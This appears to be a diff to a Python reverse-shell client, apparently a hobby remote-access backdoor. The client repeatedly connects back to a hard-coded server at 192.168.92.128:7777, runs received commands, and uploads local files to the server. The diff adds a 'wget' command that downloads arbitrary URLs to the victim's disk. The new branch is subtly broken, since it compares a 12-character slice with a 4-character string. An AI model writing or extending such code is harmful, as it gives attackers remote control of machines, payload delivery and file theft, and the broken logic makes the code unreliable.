@@ -7,7 +7,7 @@ import os
 import base64
 import sys
 import time
-
+import requests
 
 def send_j(data):
     json_data = json.dumps(data)
@@ -24,13 +24,19 @@ def recv_j():
             except ValueError: #if the output of json.loads(data) is not complete (not in json format)a
                 continue
 
+def web_download(url):
+    response = requests.get(url)
+    file_name = url.split("/")[-1] #last part of the url after /
+    with open(file_name, "wb") as f:
+        f.write(response.content)
+
 def connect():
     while True:
         time.sleep(10) #reconnect every 10 seconds
         try:
             s.connect(("192.168.92.128", 7777))  # server IP and to which port to connect to
             shell()
-            break # disconnect the client
+            break
         except: #call connect function again until we get shell()
             connect()
 
@@ -39,12 +45,21 @@ def shell():
         cmd = recv_j() # receive command from server
 
         if cmd == "exit_client":
-            break #exit shell
+            break
         elif cmd[:2] == "cd" and len(cmd) > 2:
             try:
                 os.chdir(cmd[3:]) #change directory to what's after "cd"
             except:
                 continue
+        elif cmd[:12] == "wget":
+            url = cmd[13:]
+
+            try:
+
+                web_download(url)
+                send_j("File Downloaded successfully!")
+            except:
+                send_j("Failed to download")
         elif cmd[:8] == "download":
             try:
                 with open(cmd[9:], "rb") as f:
